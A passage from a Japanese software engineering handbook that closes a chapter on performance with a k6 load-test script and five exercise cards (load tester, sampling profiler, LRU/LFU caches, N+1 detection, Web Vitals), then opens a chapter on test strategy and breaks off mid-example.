数字を読むときは、**負荷生成側が先に飽和していないか**を必ず確かめる。生成側のCPU使用率、開いているソケット数、生成側で測ったレイテンシの分布を同時に記録し、対象ではなく生成側が限界に達していた、という取り違えを防ぐ。

```javascript
// k6 (推奨)
import http from 'k6/http';
import { check, sleep } from 'k6';

export const options = {
  stages: [
    { duration: '1m', target: 100 },   // 1分で 0 → 100 ユーザー
    { duration: '3m', target: 100 },   // 3分間 100 ユーザー維持
    { duration: '1m', target: 0 },     // 1分で 0 に減衰
  ],
  thresholds: {
    http_req_duration: ['p(95)<500'],  // 95% が 500ms以内
    http_req_failed:   ['rate<0.01'],  // エラー率 1% 未満
  },
};

export default function () {
  const res = http.get('https://staging.example.com/api/users');
  check(res, {
    'status is 200': (r) => r.status === 200,
    'response time < 500ms': (r) => r.timings.duration < 500,
  });
  sleep(1);
}
```

```bash
k6 run loadtest.js
```

これで実際のトラフィック特性を再現し、ボトルネックを発見する。本番に影響しないよう、staging または隔離された環境で実施。

<a id="section-24-9"></a>
### 24.9 実装課題 ― パフォーマンスを測定・改善する
<!-- handbook:learning {"level":"practical","minutes":295} -->

<!-- handbook:narrative-bridge {"section":"24.9"} -->
個別の最適化技法を知っても、測定条件と改善目標がなければ効果を比較できない。実装課題では、同じ条件で改善前後を測り、ボトルネックがどこへ移動したかまで説明する。

第24章では Core Web Vitals、キャッシュ戦略、N+1、コネクションプール、プロファイリング、負荷テストを見た。本節では計測ツールを自作し、最適化前後の差を定量的に確認する。所要時間: 演習カードの推定時間の合計で9時間30分。

#### 課題24.1: 負荷テストツール自作 (★★★)

**目的**: autocannon / k6 風の HTTP 負荷テストツールを実装。

<!-- handbook:exercise:start {"id":"24.1"} -->
> **演習カード 課題24.1** ― 難易度 ★★★ ／ 推定時間 150分 ／ 必要サービス: localhost
>
> **前提**
>
> - 24.8 負荷テスト を読み、オープンモデルとクローズドモデルの違いと飽和点の見方を説明できる
> - 22.7 SLI / SLO / SLA (第22章) を参照し、パーセンタイルをSLOへ接続する考え方を確認する
> - node:http の createServer でローカルの計測対象サーバを起動できる
> - async 関数を固定数の worker で並行実行するパターンを書ける
>
> **完成条件 (自己採点用チェックリスト)**
>
> - [ ] runLoadTest(url, {concurrency, requests}) が指定リクエスト数ちょうどで停止し、result.requests が指定値に一致する
> - [ ] durationMs を指定した場合に、指定時間を過ぎた時点で新規リクエストを発行しなくなる
> - [ ] statusCodes がステータスコードごとの件数マップになり、合計が requests と一致する
> - [ ] percentile([1,2,3,4], 0.5) が 2 を返し、空配列では 0 を返す
> - [ ] 結果に p50 と p90 と p99 と throughput が含まれ、throughput が0より大きい
> - [ ] concurrency に0以下を渡すと concurrency must be positive で例外になる
>
> **期待出力**
>
> - 戻り値が requests / errors / durationMs / throughput / latencies / statusCodes / p50 / p90 / p99 の9キーを持つオブジェクトになる
> - ローカルの即答サーバ相手では p50 が数ミリ秒台、throughput が数百から数千 req/s のオーダーになる
> - latencies の長さが requests と一致し、statusCodes の 200 が全件になる
>
> **観察項目**
>
> - concurrency を1, 10, 100 と上げ、throughput が頭打ちになる点と p99 が跳ね上がる点がどこでずれるかを記録する
> - 計測プロセスと対象サーバが同一マシンで動いていることを踏まえ、負荷生成側のCPUが先に飽和していないかを top などで確認する
> - レスポンスボディを arrayBuffer() で読み切る行を外し、レイテンシの数値がどう変わるかを比較して「どこまでを応答時間と呼ぶか」を確定させる
>
> **テスト方法 (自己採点手順)**
>
> 1. `pnpm --filter @handbook/ch24 exec tsx --test --test-name-pattern="load tester" solutions.test.ts` を実行し、passすれば合格
> 2. `pnpm --filter @handbook/ch24 run test` で章の5件がすべてpassすることを確認する
> 3. 自作実装で createServer(0) の一時サーバへ concurrency:4, requests:20 で実行し、statusCodes[200] が20、latencies の長さが20になれば計数が正しいと判定する
>
> **段階的ヒント** (模範解答を開く前に、1から順に必要な分だけ読む)
>
> 1. **方針**: 総リクエスト数を先に配列で作って Promise.all するとメモリを食い、並行数の制御にならない。固定数の worker が「まだ続けてよいか」を毎回問い合わせるループ構造から設計する
> 2. **構造**: should() のような継続条件関数に、時間の締め切りとリクエスト上限の両方を入れる。worker は while (should()) の中で発行時刻を performance.now() で取り、fetch と本文読み切りのあと差分を latencies に push する
> 3. **実装の要点**: パーセンタイルは昇順ソート後 Math.ceil(p * n) - 1 番目を取り、上限を n - 1 で clamp する。エラーは reject と、レスポンスは返るが ok でない場合の2種類あり、どちらも errors に数えつつレイテンシは記録する
>
> **本番利用時の警告**
>
> - 負荷をかける対象は自分のマシンのlocalhostか、自分が明確に所有し許可を得た検証環境だけに限定する。第三者のサイトやSaaS、共用のステージング環境へ向けて実行するとDoS攻撃と区別がつかず、契約違反や不正アクセスにあたる
> - このツールは負荷生成側と計測対象を同一ホストで走らせる前提で、CPUとネットワークスタックを共有する。得られた数値は絶対値としては使えず、同一条件での改善前後の比較にのみ使う
> - レイテンシを全件配列で保持するため長時間の実行でメモリが線形に増え、接続の再利用やキープアライブ、DNS解決コスト、TLSハンドシェイクの分離も行っていない。本番の容量計画には k6 や autocannon など、ヒストグラム集約と分散実行を持つツールを使う
>
> **導線**
>
> - 開始地点: `code/ch24/mini-loadtest.ts`
> - 模範解答: `code/ch24/mini-loadtest.solution.ts`
>
> **推定時間の内訳**: worker 並行制御の実装35分、パーセンタイルと集計の実装30分、テスト用サーバの用意と実行25分、並行数を変えた飽和点の観察と記録60分
<!-- handbook:exercise:end -->

**要件**:

```bash
$ tsx mini-loadtest.ts http://localhost:3000/ -c 100 -d 30s

Running 30s test @ http://localhost:3000/
100 connections

Requests:      45,231
Throughput:    1,507 req/s
Latency p50:   42ms
Latency p90:   89ms
Latency p99:   156ms
Errors:        12 (0.03%)

Status codes:
  200: 45,219
  500: 12
```

**機能**:
- 並列接続数の指定
- 持続時間 (s) または リクエスト数で指定
- レイテンシのパーセンタイル (p50/p90/p99)
- ステータスコード別カウント
- スループット (req/s)

模範解答: `code/ch24/mini-loadtest.solution.ts`

#### 課題24.2: CPU プロファイラ (サンプリング型) (★★★)

**目的**: 「**重い関数**」を見つけるためのプロファイラを自作。

<!-- handbook:exercise:start {"id":"24.2"} -->
> **演習カード 課題24.2** ― 難易度 ★★★ ／ 推定時間 150分 ／ 必要サービス: なし
>
> **前提**
>
> - 24.7 プロファイリング を読み、サンプリング型とインストルメンテーション型の違いを説明できる
> - 自己時間 (self) と累積時間 (total) の定義を区別できる
> - node:async_hooks の AsyncLocalStorage で非同期をまたぐコンテキストを保持できる
> - setInterval で一定間隔のタイマーを起動・停止できる
>
> **完成条件 (自己採点用チェックリスト)**
>
> - [ ] withFrame(name, fn) がスタックへフレーム名を積み、fn の実行中だけ有効になる
> - [ ] start() でタイマーが起動し、二重に start() を呼ぶと already started で例外になる
> - [ ] report() の entries が関数名をキーに self と total を持つ Map を返す
> - [ ] 同じ呼び出し経路を3回サンプリングしたとき、親フレームの total が3、葉フレームの self がその葉の出現回数に一致する
> - [ ] flamegraph() が「フレームをセミコロンで連結した経路 スペース 回数」という行を、回数の降順で出力する
> - [ ] stop() がタイマーを解除し、report() と同じ集計結果を返す
>
> **期待出力**
>
> - report() が samples と entries と Object の3キーを返し、samples が記録済みスタック数になる
> - flamegraph() の出力が request;db 2 のような1行1経路のテキストになる
> - 葉にならないフレームは self が0のまま total だけが増える
>
> **観察項目**
>
> - サンプリング間隔を1msから10msへ変えたとき、短時間しか走らない関数が結果から消えることを確認し、サンプリングの取りこぼしを体感する
> - self が大きい関数と total が大きい関数を並べ、前者が「そこで時間を使っている」、後者が「そこを経由している」の違いになることを確認する
> - 同期の重いループと await を挟む処理の両方を計測し、AsyncLocalStorage がどちらでフレームを保てているかを確認する
>
> **テスト方法 (自己採点手順)**
>
> 1. `pnpm --filter @handbook/ch24 exec tsx --test --test-name-pattern="sampling profiler" solutions.test.ts` を実行し、passすれば合格
> 2. `pnpm --filter @handbook/ch24 run test` で章の5件がすべてpassすることを確認する
> 3. 自作実装で record(['a','b']) を2回、record(['a','c']) を1回与え、a の total が3、b の self が2になれば集計が正しいと判定する
>
> **段階的ヒント** (模範解答を開く前に、1から順に必要な分だけ読む)
>
> 1. **方針**: タイマーで実際に採取する前に、スタック配列を直接渡して集計だけを検証できる record() を用意する。集計のバグとタイマーのバグを切り離せる
> 2. **構造**: AsyncLocalStorage に文字列配列を入れ、withFrame は既存のストアに名前を足した新しい配列で run する。集計はサンプルごとに全フレームの total を加算し、末尾のフレームだけ self を加算する
> 3. **実装の要点**: flamegraph は経路 (配列を join(';') した文字列) をキーにした回数の Map にして降順ソートする。start() を二重に呼ぶとタイマーが漏れるので、既存タイマーの有無を先に検査して例外にする
>
> **本番利用時の警告**
>
> - このプロファイラは自前の withFrame で明示的に囲んだ範囲しか見えず、ライブラリ内部やV8のネイティブフレーム、GCの停止時間は一切現れない。本番のCPU分析には node --cpu-prof や --inspect で取る V8 のプロファイルを使う
> - setInterval によるサンプリングはイベントループが空いたときにしか発火しないため、同期の長いブロックの最中はサンプルが1つも取れず、最も重い区間が結果から欠落する。この構造的な盲点を知らずに「重い関数が見つからない」と判断してはいけない
> - 全サンプルのスタックを配列で保持し続けるので、長時間の常時プロファイリングでメモリが増え続ける。本番で常駐させる場合は集約済みカウンタだけを保持し、サンプリング頻度も落とす必要がある
>
> **導線**
>
> - 開始地点: `code/ch24/profiler.ts`
> - 模範解答: `code/ch24/profiler.solution.ts`
>
> **推定時間の内訳**: AsyncLocalStorage によるフレーム管理の実装30分、self と total の集計実装35分、flamegraph 出力25分、間隔を変えた取りこぼしと同期ブロックの盲点の観察60分
<!-- handbook:exercise:end -->

**要件**:
- 一定間隔 (例: 1ms) で現在のスタックトレースを記録
- どの関数がサンプル中に何回現れたか集計
- 「自己時間」と「累積時間」を区別
- Flame graph 風のテキスト出力

模範解答: `code/ch24/profiler.solution.ts`

#### 課題24.3: LRU / LFU キャッシュ実装 (★★)

**目的**: 2つの主要なキャッシュ追い出し戦略を実装。

<!-- handbook:exercise:start {"id":"24.3"} -->
> **演習カード 課題24.3** ― 難易度 ★★ ／ 推定時間 90分 ／ 必要サービス: なし
>
> **前提**
>
> - 24.5 キャッシュ戦略 を読み、キャッシュヒット率と追い出し方針の関係を説明できる
> - 24.6 アルゴリズムとデータ構造 を読み、O(1) 操作を実現するデータ構造の考え方を確認する
> - JavaScript の Map が挿入順を保持することを知っている
> - Zipf 分布のような偏りのあるアクセス列を生成できる
>
> **完成条件 (自己採点用チェックリスト)**
>
> - [ ] LRUCache(2) に a と b を入れて a を get したあと c を set すると、b が追い出される
> - [ ] LFUCache(2) で同じ操作をしたとき、参照回数の少ない b が追い出される
> - [ ] LFU で頻度が同じ要素が複数あるとき、最後に使われた時刻が最も古いものが追い出される
> - [ ] get したキーが LRU では最新位置へ移動し、keys() の並びが更新される
> - [ ] capacity に0以下を渡すと例外になる
> - [ ] benchmarkCache(cache, sequence) が operations と hits と hitRate を返し、hitRate が0以上1以下になる
>
> **期待出力**
>
> - benchmarkCache の戻り値が {operations: 列の長さ, hits: 命中回数, hitRate: hits/operations} という3キーのオブジェクトになる
> - 偏りの強いアクセス列では LFU のヒット率が LRU を上回り、一様ランダムやスキャン的な列では差が縮むか逆転する
> - has() が追い出されたキーに対して false を返す
>
> **観察項目**
>
> - 同じアクセス列を LRU と LFU に流し、ヒット率の差が分布の偏り (Zipf の指数) によってどう変わるかを表にする
> - 全要素を1回ずつなめるスキャン的アクセスを流し、LRU のキャッシュ内容が全入れ替えになる cache pollution を確認する
> - LFU で一度だけ大量参照された古いキーが居座り続ける現象を再現し、頻度の減衰 (aging) が必要になる理由を確認する
>
> **テスト方法 (自己採点手順)**
>
> 1. `pnpm --filter @handbook/ch24 exec tsx --test --test-name-pattern="LRU and LFU" solutions.test.ts` を実行し、passすれば合格
> 2. `pnpm --filter @handbook/ch24 run test` で章の5件がすべてpassすることを確認する
> 3. 自作実装に容量2で a, b, get(a), c の順に操作し、has('b') が false、has('a') が true になれば追い出し方針が正しいと判定する
>
> **段階的ヒント** (模範解答を開く前に、1から順に必要な分だけ読む)
>
> 1. **方針**: 自前の双方向連結リストを書く前に、Map が挿入順を保つ性質で LRU が書けないかを検討する。LFU は順序だけでは足りず、頻度と最終使用時刻の2つの鍵が要ると気づくのが分かれ目
> 2. **構造**: LRU は get のたびに delete してから set し直すことで末尾へ移動させ、size が capacity を超えたら keys().next().value を削除する。LFU は値と freq と tick を持つエントリを Map に入れ、追い出し時に freq 昇順、同値なら tick 昇順で最小を選ぶ
> 3. **実装の要点**: LRU の get では値が undefined のときに delete/set をしてはいけない (未登録キーを登録してしまう)。LFU の set は既存キーの更新と新規挿入で分岐し、容量チェックは新規挿入時だけ行う
>
> **本番利用時の警告**
>
> - この実装は TTL (有効期限) を持たないため、元データが更新されても古い値を返し続ける。実サービスでキャッシュ層に使うと、削除済み・権限変更済みのデータを配り続ける情報漏えいにつながる
> - LFU の追い出し候補探索は Map 全体を線形走査するため、容量が大きいと set のたびに O(n) かかる。100万件級のベンチマークでは追い出しコスト自体が測定結果を歪めるので、本番実装では頻度リスト方式で O(1) にする
> - プロセス内キャッシュはインスタンスごとに独立し、値の書き込み時に他インスタンスへ無効化が伝わらない。複数台構成では Redis などの共有キャッシュか、明示的な無効化チャネルが必要になる
>
> **導線**
>
> - 開始地点: `code/ch24/cache.ts`
> - 模範解答: `code/ch24/cache.solution.ts`
>
> **推定時間の内訳**: LRU の実装20分、LFU のタイブレーク込み実装30分、ベンチマーク関数と偏り分布の生成20分、両方式のヒット率比較と汚染現象の観察20分
<!-- handbook:exercise:end -->

**LRU (Least Recently Used)**:
- 最後にアクセスされてから長時間経った要素を追い出す
- DoublyLinkedList + HashMap で O(1)

**LFU (Least Frequently Used)**:
- アクセス頻度の低い要素を追い出す
- 同じ頻度なら LRU をタイブレーク

```typescript
const lru = new LRUCache<string, string>(3);
lru.set('a', '1'); lru.set('b', '2'); lru.set('c', '3');
lru.get('a');
lru.set('d', '4');  // 'b' が追い出される (lastUsed が最古)
```

**ベンチマーク**:
- 100万操作、ヒット率測定
- LRU vs LFU でデータ分布 (Zipf 分布) を変えて比較

模範解答: `code/ch24/cache.solution.ts`

#### 課題24.4: N+1 自動検出 + DataLoader 比較 (★★)

**目的**: 課題14.3 を発展させ、N+1 が起きると警告するモニタリングを実装。

<!-- handbook:exercise:start {"id":"24.4"} -->
> **演習カード 課題24.4** ― 難易度 ★★ ／ 推定時間 90分 ／ 必要サービス: なし
>
> **前提**
>
> - 24.4 バックエンド最適化 を読み、N+1 クエリが発生する典型パターンを説明できる
> - 第14章の課題14.3 で扱った N+1 とバッチ取得の関係を思い出しておく
> - node:async_hooks の AsyncLocalStorage でリクエストスコープを表現できる
> - queueMicrotask と Promise の解決順序を説明できる
>
> **完成条件 (自己採点用チェックリスト)**
>
> - [ ] withRequest(id, fn) の外で recordQuery() を呼ぶと recordQuery must run inside withRequest で例外になる
> - [ ] 同一リクエスト内で同じクエリパターンを threshold 回記録したときに警告が1件だけ増える
> - [ ] 警告オブジェクトが requestId と pattern と count と stack の4キーを持つ
> - [ ] threshold を超えて呼び続けても警告が重複して増えない
> - [ ] 別の withRequest スコープではカウンタが独立し、警告が引き継がれない
> - [ ] MiniDataLoader で同一キーを2回 load しても batch 関数の呼び出しが1回で済む
>
> **期待出力**
>
> - threshold:3 で4回 recordQuery した場合、warnings() の長さが1になる
> - 警告の stack に初回記録時の呼び出し位置が文字列として含まれる
> - MiniDataLoader.load(1) を Promise.all で2本同時に呼ぶと、両方とも同じ値を返しつつバッチ回数が1になる
>
> **観察項目**
>
> - クエリのパターン (プレースホルダ付きSQL) とパラメータを分けて記録する設計により、値だけ違う同型クエリが1つのパターンへ集約される様子を確認する
> - 警告に添付される stack が「初回に記録した時点」のものであることを確認し、N+1 の発生源を特定するには最初の呼び出し位置が必要な理由を読み取る
> - DataLoader を通したときと通さないときで、batch 関数の呼び出し回数が N から1へ変わることを数え、往復回数の削減がどこに効くかを確認する
>
> **テスト方法 (自己採点手順)**
>
> 1. `pnpm --filter @handbook/ch24 exec tsx --test --test-name-pattern="monitor warns at threshold" solutions.test.ts` を実行し、passすれば合格
> 2. `pnpm --filter @handbook/ch24 run test` で章の5件がすべてpassすることを確認する
> 3. 自作実装で threshold:5 のまま同一パターンを10回記録し、warnings() の長さが1、count が5であれば発火条件が正しいと判定する
>
> **段階的ヒント** (模範解答を開く前に、1から順に必要な分だけ読む)
>
> 1. **方針**: 「同じリクエストの中で」という条件をどう表現するかが要点。グローバル変数では並行リクエストが混ざるので、非同期をまたいで持ち回れるコンテキストを先に用意する
> 2. **構造**: AsyncLocalStorage.run() でリクエストIDとクエリ集計 Map と警告配列を持つ状態を作り、recordQuery は getStore() でそれを取り出してパターン別にカウントする。DataLoader は保留キーの Map と queueMicrotask による1回のフラッシュで組む
> 3. **実装の要点**: 警告が重複しないよう、発火条件は count > threshold ではなく count === threshold の等値比較にする。DataLoader の flush では先に pending を新しい Map に差し替えてから await しないと、バッチ中に来た load を取りこぼす
>
> **本番利用時の警告**
>
> - この監視は recordQuery を明示的に呼んだ箇所しか見えず、ORMやドライバの内部で発行されるクエリは捕捉できない。本番ではドライバのフックや OpenTelemetry の計装を通す必要がある
> - 警告のたびに Error().stack を生成するのはコストが高く、リクエストごとに Map と配列を保持し続けるためメモリも増える。開発環境限定のフラグで囲まず本番へ入れると、監視自体が性能問題になる
> - MiniDataLoader はキャッシュの無効化も TTL も持たず、batch がキーを返さないと例外で全体が落ちる。リクエストをまたいで使い回すと古い値を配るため、リクエスト単位で生成し捨てる運用が前提になる
>
> **導線**
>
> - 開始地点: `code/ch24/n1-monitor.ts`
> - 模範解答: `code/ch24/n1-monitor.solution.ts`
>
> **推定時間の内訳**: AsyncLocalStorage によるリクエストスコープの実装25分、閾値判定と警告生成の実装25分、MiniDataLoader のバッチ実装25分、バッチ有無の呼び出し回数比較15分
<!-- handbook:exercise:end -->

**要件**:
- DB アクセス層に hook を入れ、同一クエリパターンが N 回 (デフォルト 5回) 同じリクエスト内で発火したら警告
- AsyncLocalStorage でリクエストスコープを判定
- 警告には stack trace を含める

```typescript
const monitor = new N1Monitor({ threshold: 5 });
withRequest('req-1', async () => {
  for (let i = 0; i < 10; i++) {
    monitor.recordQuery('SELECT * FROM users WHERE id = ?', i);
  }
});
// → Warning: N+1 detected! Same query pattern "SELECT * FROM users WHERE id = ?" executed 10 times
```

模範解答: `code/ch24/n1-monitor.solution.ts`

#### 課題24.5: Web Vitals 計測スクリプト (LCP/INP/CLS) (★★)

**目的**: Chrome DevTools が見せる Core Web Vitals を、JavaScript で実測。

<!-- handbook:exercise:start {"id":"24.5"} -->
> **演習カード 課題24.5** ― 難易度 ★★ ／ 推定時間 90分 ／ 必要サービス: Chrome、localhost
>
> **前提**
>
> - 24.1 Core Web Vitals を読み、LCP と CLS と INP のしきい値と対象イベントを説明できる
> - 24.2 フロントエンド最適化 を読み、レイアウトシフトの原因を挙げられる
> - PerformanceObserver の observe に type と buffered を渡す書き方を知っている
> - ローカルHTTPサーバ (npx http-server など) でファイルを配信し、Chrome で開ける
>
> **完成条件 (自己採点用チェックリスト)**
>
> - [ ] PerformanceObserver.supportedEntryTypes を確認してから observe を呼び、非対応環境でも例外を出さない
> - [ ] largest-contentful-paint を buffered:true で観測し、ページ表示直後から LCP の値が表示される
> - [ ] layout-shift のうち hadRecentInput が true のエントリを除外して CLS を累積する
> - [ ] type:'event' を durationThreshold 付きで観測し、ボタン操作後に INP の値が更新される
> - [ ] 計測結果が window.__webVitals から読め、画面上の output 要素にもJSONとして表示される
> - [ ] レイアウトシフトを起こすボタンを押すと、約1.2秒後にシフトが起き CLS の値が増加する (クリック直後に動かすと `hadRecentInput` が true になり、意図どおり CLS へ加算されない)
>
> **期待出力**
>
> - output 要素に LCP と CLS と INP の3キーを持つJSONが整形表示され、初期状態では値が null と0になる
> - LCP と INP はミリ秒の整数、CLS は小数第4位までの無次元の数値として表示される
> - DevTools のコンソールで window.__webVitals を評価すると、その時点の3指標が返る
>
> **観察項目**
>
> - ページを再読み込みして LCP の対象要素が何かを DevTools の Performance パネルの LCP マーカーで確認し、スクリプトが返す数値と突き合わせる
> - INP 計測用ボタンの中でメインスレッドを意図的に占有し、押してから描画されるまでの遅延が INP の数値として現れることを確認する
> - シフトボタンの遅延を 500ms 未満へ縮めると `hadRecentInput` が true になり CLS が増えなくなることを確認する。CLS が測るのは「利用者が意図していない」シフトであり、操作への応答として動くものは対象外である。あわせて DevTools の Network パネルでスロットリングを Fast 3G などに変えて LCP を見る。この教材ページの LCP 対象は文字なので大きくは変わらない。画像を LCP 対象にしたページで比べると差が出る
>
> **テスト方法 (自己採点手順)**
>
> 1. `pnpm --filter @handbook/ch24 exec tsx --test --test-name-pattern="Web Vitals HTML" solutions.test.ts` を実行し、必要なエントリタイプが含まれていればpassする
> 2. `npx http-server code/ch24 -p 8080` を起動し、Chrome で http://localhost:8080/web-vitals.html を開いて output に LCP の数値が出れば計測が動いていると判定する
> 3. レイアウトシフト発生ボタンを押し、約1.2秒後のシフトを待ってから output を見る。これを3回繰り返して CLS が単調増加すれば累積が正しいと判定する
>
> **段階的ヒント** (模範解答を開く前に、1から順に必要な分だけ読む)
>
> 1. **方針**: 3指標を1つの状態オブジェクトにまとめ、どのオブザーバが発火しても同じ描画関数を呼ぶ構造にする。指標ごとに表示処理を書き分けると同期がずれる
> 2. **構造**: LCP は最後に届いたエントリの startTime、CLS は hadRecentInput が false のエントリの value を加算、INP は event エントリの duration の最大値、という3種類の集約方法を使い分ける。いずれも observe に buffered:true を付けて発行済みのエントリを拾う
> 3. **実装の要点**: event 型は durationThreshold を指定しないと短い操作が届かないため16程度を渡す。CLS の加算は浮動小数の誤差が見えるので toFixed(4) で丸めてから状態へ戻す
>
> **本番利用時の警告**
>
> - この計測はラボ環境の単一ブラウザ・単一ネットワーク条件の値であり、実利用者の分布 (フィールドデータ) ではない。1台のマシンで出た良い数値をSLOの達成根拠にすると、低速端末や低速回線の利用者の実態を見落とす
> - INP はこのページでは event エントリの duration の最大値で近似しており、Web Vitals の公式定義 (全操作の分布から高位の値を選ぶ) とは一致しない。本番計測には web-vitals ライブラリを使い、定義の更新に追従させる
> - PerformanceObserver のエントリタイプはブラウザによって対応状況が異なり、Safari では layout-shift も largest-contentful-paint も取得できない場合がある。対応していないブラウザで値が空になることを「良好」と誤読してはいけない
>
> **導線**
>
> - 開始地点: `code/ch24/web-vitals.html`
> - 模範解答: `code/ch24/web-vitals.solution.html`
>
> **推定時間の内訳**: 3種のオブザーバ設置と状態管理の実装35分、シフト発生とINP計測用の操作要素の実装20分、スロットリングを変えた計測と DevTools との突き合わせ35分
<!-- handbook:exercise:end -->

**要件**: 単一の HTML ファイルとして、ブラウザで開いて以下を測定:
- LCP (Largest Contentful Paint): 最大要素の表示完了
- CLS (Cumulative Layout Shift): レイアウトのずれ累積
- INP (Interaction to Next Paint): 入力から次の描画までの遅延

PerformanceObserver API を使う。

模範解答: `code/ch24/web-vitals.solution.html`

---

<!-- handbook:code-usage:start {"chapter":24} -->
### 第24章のコード集の使い方

<!-- handbook:generated; do not edit -->

コード集は pnpm ワークスペースとして構成してある (CODE_TOOLCHAIN.md)。依存はリポジトリ最上位で一度だけ解決し、章ごとの操作は `--filter` でワークスペースを指定する。

```bash
# 初回のみ。リポジトリ最上位で実行する
pnpm install

# 第24章の模範解答をまとめて検証する
pnpm --filter @handbook/ch24 run test

# 模範解答を個別に実行する
pnpm --filter @handbook/ch24 exec tsx mini-loadtest.solution.ts  # 課題24.1
pnpm --filter @handbook/ch24 exec tsx profiler.solution.ts       # 課題24.2
pnpm --filter @handbook/ch24 exec tsx cache.solution.ts          # 課題24.3
pnpm --filter @handbook/ch24 exec tsx n1-monitor.solution.ts     # 課題24.4
open code/ch24/web-vitals.solution.html                          # 課題24.5
```

開始地点は模範解答と同じ場所に置いてある (`<name>.ts` と `<name>.solution.ts`、またはディレクトリ課題の `starter/` と `solution/`)。課題ごとの完成条件と採点手順は本節の演習カードと `code/ch24/README.md` にある。模範解答の多くは関数を export するだけで、実行して意味のある出力が出るかどうかは課題によって異なる。まず `run test` で通し、個別実行は演習カードのテスト方法に従う。

`open` は macOS のコマンドである。Linux では `xdg-open`、Windows では `start` を使う。
<!-- handbook:code-usage:end -->


ここまでで、利用者が待つ時間を計測し、ボトルネックを改善する方法を得た。しかし、性能改善や設定変更が別の機能・安全性を壊していないかを毎回手作業で確認することはできない。第25章では、重要な性質を変更後も再現可能に検証するテスト戦略へ進む。

---

<a id="chapter-25"></a>
## 第25章 テスト戦略

第24章で、性能改善は測定条件を固定し、改善前後を比較して初めて判断できると分かった。同じことは機能、セキュリティ、障害時の振る舞いにも当てはまる。一度正しいことを確認しても、その証拠が人の記憶や手作業にしか残らなければ、次の変更で性質が失われても気付けない。

本章では、壊れたときに価値のある警報を、Unit、Integration、Component、E2Eなどの異なる境界へ配置する。テスト数を増やすのではなく、検出したい失敗、実行コスト、環境との差を基準に組み合わせる。第26章では、テストで確認すべき対象を単一プロセスから、負荷増大、リモート依存、部分障害を含むシステム全体へ広げる。
<!-- handbook:chapter-guide:start {"chapter":25} -->
> **この章の学習ガイド**
>
> **解決する実務上の問題**  
> 変更への恐怖を減らしつつ、遅く脆いテストや実装詳細への過剰依存を避け、重要な振る舞いを適切な層で検証する。
>
> **到達目標**
> - Unit/Integration/E2E/Componentの検出範囲とコストを説明できる。
> - test doubleを目的に応じて使い分けられる。
> - property、mutation、visual regressionを必要な箇所へ適用できる。
> - アクセシビリティを自動検査・キーボード走査・支援技術での確認の3層に分けて検証できる。
>
> 到達目標は章全体に対するものである。標準通読ルートは必修節だけを読むため、下の「中核概念」に (実務選択) (発展) (展望) と付いた節がある章では、その節を読むまで到達目標の一部が埋まらない。必修節を読み終えた時点で説明できない項目があれば、まず付記のある節へ進む。
>
> **前提知識**
> - [5.9 エラー処理の設計](03-part2-frontend.md#section-5-9) ― エラー処理
> - [12.6 OpenAPI ― API設計の標準仕様](04-part3-backend.md#section-12-6) ― API契約
>
> **中核概念**  
> [25.1 テストピラミッド vs テストトロフィー](#section-25-1)、[25.2 Unit テスト](#section-25-2)、[25.3 Integration テスト](#section-25-3)、[25.4 E2E テスト](#section-25-4)、[25.6 Mock と Stub と Fake](#section-25-6)、[25.10 何をテストすべきか](#section-25-10)、[25.11 アクセシビリティの検証 ― 自動チェック、キーボード走査、読み上げ確認](#section-25-11) (実務選択)
>
> **最小実装**  
> [25.12 実装課題 ― テスト技法を自分の手で](#section-25-12) (実務選択)
>
> **本番実装との差分**
> - 教材テストは並行実行、flaky管理、データ分離、ブラウザ差、外部サービス契約を簡略化する。
>
> **典型的な失敗**
> - 実装詳細をモックしリファクタリングで壊れる。
> - E2Eだけで全分岐を覆う。
> - 失敗が再現しないテストを放置する。
> - 自動検査が0件であることをアクセシビリティの合格と読む。
>
> **診断・デバッグ方法**
> - 失敗を再実行条件、seed、環境、artifact付きで保存する。
> - テスト時間とflaky率を層別に追う。
> - 判定できない規則を明示的に無効化し、検査範囲を実際より広く見積もらない。
>
> **意思決定チェックリスト**
> - 壊れたとき最も価値のある警報は何か。
> - 実サービスとfakeの契約差をどう検出するか。
> - 既知の違反を、規則単位ではなく箇所単位・期限付きで抑制できているか。
>
> **演習と評価基準**  
> 対象: [25.12 実装課題 ― テスト技法を自分の手で](#section-25-12) (実務選択)
> - 同じ機能へ複数層のテストを置き、重複と役割を説明できる。
> - 自動検査で拾える違反と拾えない違反を、同じ画面で区別して示せる。
>
> **一次資料・発展資料**
> - Testing Library guiding principles
> - Playwright documentation
> - property-based testing literature
> - mutation testing literature
> - W3C WAI-ARIA Authoring Practices Guide
> - Deque Systems, axe-core rule descriptions
<!-- handbook:chapter-guide:end -->

<a id="section-25-1"></a>
### 25.1 テストピラミッド vs テストトロフィー
<!-- handbook:learning {"level":"required","minutes":5} -->
<!-- handbook:index {"group":"た行","term":"テストトロフィー"} -->
<!-- handbook:index {"group":"た行","term":"テストピラミッド"} -->

<!-- handbook:narrative-bridge {"section":"25.1"} -->
性能改善やセキュリティ修正は、別の振る舞いを壊す可能性がある。テスト戦略では、すべてを同じ粒度で確認するのではなく、失敗の種類と実行コストに応じて検証境界を配分する。

**伝統的なテストピラミッド** [Cohn, 2009]:

```text
       /\
      /  \    E2E (少)
     /────\
    /      \  Integration (中)
   /────────\
  /          \  Unit (多)
 /────────────\
```

「Unit を多く、E2E を少なく」が原則。E2Eは遅く脆い、Unit は速く安定。

**テストトロフィー** [Dodds, 2018]:

2018年以降、「Integration を厚く」という配分が再評価されている [Dodds, 2018]。

```text
      ┌────────┐
      │  E2E   │          最も少ない
 ┌────┴────────┴────┐
 │   Integration    │     ここを最も厚くする
 └──┬────────────┬──┘
    │    Unit    │
  ┌─┴────────────┴─┐
  │     Static     │      型検査と Lint が土台
  └────────────────┘
```

「Unit テストで実装詳細を縛りすぎると、リファクタリングでテストが壊れる」「ユーザー視点に近いテストの方が価値が高い」という思想。

実務ではプロジェクトの性質次第。**ロジックが重いライブラリ** はUnit中心、**Webアプリ** はIntegration中心、が無難。

<a id="section-25-2"></a>
### 25.2 Unit テスト
<!-- handbook:learning {"level":"required","minutes":5} -->

<!-- handbook:narrative-bridge {"section":"25.2"} -->
テスト全体の配分を決めたら、まず外部依存を持たない小さな規則を高速に確かめる。Unitテストは、純粋な計算や状態遷移の失敗位置を狭く特定する。

関数単位のテスト。

```typescript
// math.ts
export function discountedPrice(price: number, discount: number): number {
  if (discount < 0 || discount > 1) throw new Error('Invalid discount');
  return Math.round(price * (1 - discount));
}

// math.test.ts (Vitest)
import { describe, it, expect } from 'vitest';
import { discountedPrice } from './math';

describe('discountedPrice', () => {
  it('applies discount', () => {
